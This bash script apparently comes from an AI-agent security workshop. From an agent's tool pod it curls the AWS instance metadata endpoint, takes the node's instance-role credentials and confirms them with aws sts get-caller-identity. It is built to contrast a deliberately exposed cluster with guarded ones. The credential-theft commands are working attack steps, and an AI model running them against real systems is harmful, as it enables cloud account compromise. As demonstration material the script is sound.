#!/usr/bin/env bash
# ABOUTME: The IMDS credential-theft demonstration (#113, ASI03). From the agent's tool pod it curls
# ABOUTME: 169.254.169.254, steals the node instance-role creds and runs `aws sts get-caller-identity`.
#
# This lands ONLY on the community cluster (attackme), where fleet.sh provisions the node with
# var.imds_hop_limit=2 and the burn profile ships no agent-deny-imds ClusterNetworkPolicy. On every
# other cluster the node's hop limit of 1 (and, off the burn profile, the deny policy) keep a pod one
# hop short of IMDS, so the token request times out and the script reports BLOCKED. Run it on both to
# make the contrast: the moment a container compromise becomes a cloud-account one, and the moment it
# does not. It only READS (an IMDSv2 GET and one get-caller-identity); it changes nothing.
#
# Kube-context safety (CLAUDE.md): CONTEXT is REQUIRED and every kubectl carries --context "$CONTEXT".
# There is no current-context fallback: a demo that cannot name its target cluster fails loudly.
set -uo pipefail

: "${CONTEXT:?set CONTEXT to the target kube-context (e.g. the community/attackme cluster); no fallback}"

# The realistic framing: the agent runs run_shell in its tool pod, so the "attacker" is whatever the
# tool pod can reach. We exec the theft there rather than from the host, so what succeeds is exactly
# what a compromised agent could do.
POD_SELECTOR='deploy/workshop-mcp'
NS='agent'

echo "== IMDS credential theft from the agent tool pod on context: ${CONTEXT} =="
echo "   (node IMDS at 169.254.169.254; Pod Identity's 169.254.170.23 is a different endpoint and is not this)"
echo

kubectl --context "$CONTEXT" -n "$NS" exec "$POD_SELECTOR" -- sh -c '
  set -u
  IMDS=http://169.254.169.254
  # IMDSv2: a PUT gets a session token. hop_limit=1 kills this packet one hop short of the node, so on a
  # guarded cluster the request times out; hop_limit=2 (the community cluster) lets it through.
  TOKEN=$(curl -s -m 3 -X PUT -H "X-aws-ec2-metadata-token-ttl-seconds: 60" "$IMDS/latest/api/token" 2>/dev/null)
  if [ -z "$TOKEN" ]; then
    echo "IMDS: BLOCKED. No IMDSv2 token (the node is one hop out of reach). The theft FAILS here."
    echo "      This is what every attendee and admin cluster does: hop limit 1, the container stays a container."
    exit 0
  fi
  H="X-aws-ec2-metadata-token: $TOKEN"
  ROLE=$(curl -s -m 3 -H "$H" "$IMDS/latest/meta-data/iam/security-credentials/")
  echo "IMDS: REACHED. The node handed out its instance-role name: ${ROLE}"
  CREDS=$(curl -s -m 3 -H "$H" "$IMDS/latest/meta-data/iam/security-credentials/${ROLE}")
  AKID=$(printf "%s" "$CREDS" | sed -n "s/.*\"AccessKeyId\" *: *\"\([^\"]*\)\".*/\1/p")
  SAK=$(printf "%s" "$CREDS" | sed -n "s/.*\"SecretAccessKey\" *: *\"\([^\"]*\)\".*/\1/p")
  TOK=$(printf "%s" "$CREDS" | sed -n "s/.*\"Token\" *: *\"\([^\"]*\)\".*/\1/p")
  AKID_SHOWN=$(printf "%s" "$AKID" | cut -c1-8)
  echo "Stolen node credentials: AccessKeyId=${AKID_SHOWN}... a real, usable key for the node role."
  echo
  echo "Who are we now? (aws sts get-caller-identity using the STOLEN node creds)"
  AWS_ACCESS_KEY_ID="$AKID" AWS_SECRET_ACCESS_KEY="$SAK" AWS_SESSION_TOKEN="$TOK" \
    aws sts get-caller-identity --query Arn --output text 2>&1
  echo
  echo "That ARN is a NODE ROLE. The blast radius just left the cluster (ASI03)."
'
